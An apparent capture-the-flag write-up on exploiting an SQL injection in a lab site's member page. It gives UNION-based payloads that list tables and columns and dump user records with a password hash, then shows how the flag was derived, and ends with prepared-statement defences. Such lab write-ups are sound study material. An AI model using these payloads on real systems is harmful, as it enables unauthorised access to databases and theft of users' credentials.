# SQL injection

## Found on

```
<ip>/?page=member
```

## How to exploit

The nmap tool informed of a possible Cross Site Request Forgeries (CSRF) vulnribility on this page.

What we found was an SQL Injection vulnribility.

Typing anything other than an id (integer) returns an SQL error. This gives an indication that the input is not sterilized before running a query.

This is very dangerous as attackers notice these things and mark inputs and fields like these as targets.  

1. To get table names:
```
3 union select null, concat (table_name) from information_schema.tables where table_schema = database ()
```

2. To get user table column names:
```
3 union select null, concat (column_name) from information_schema.columns where table_schema = database ()
```

3. To get all data of users:
```
3 union select NULL, concat (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users
```

The last injection reveals this:
```
Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
```

With these instructions getting the flag was easy.
1. Decript the hash -> FortyTwo
2. Encrypt the lowercase phrase with Sh256 -> fortytwo

## A brief explination of the SQL Injection

Typing any text into the input field returns this error:
```bash
Unknown column 'sminnaar' in 'where clause'
```
This gives me an idea of how the SQL is structured:
```bash
SELECT user WHERE id = sminnaar
```
In the case of the injection, the WHERE is completed by the 3 I entered and then the query is extended to include more queries.

This is then used to get information out of the database that I should not be able to access.

## How to protect against

* Use prepared statements or strerilize the input from the form.
* Using layered security minimizes the risk of vulnribilities being exposed.
* Using [Parameterized Queries in SQL](https://use-the-index-luke.com/sql/where-clause/bind-parameters)

## Resources:
* https://owasp.org/www-community/attacks/SQL_Injection
* https://portswigger.net/web-security/sql-injection/union-attacks
* https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
* https://www.softwaretestinghelp.com/sql-injection-how-to-test-application-for-sql-injection-attacks/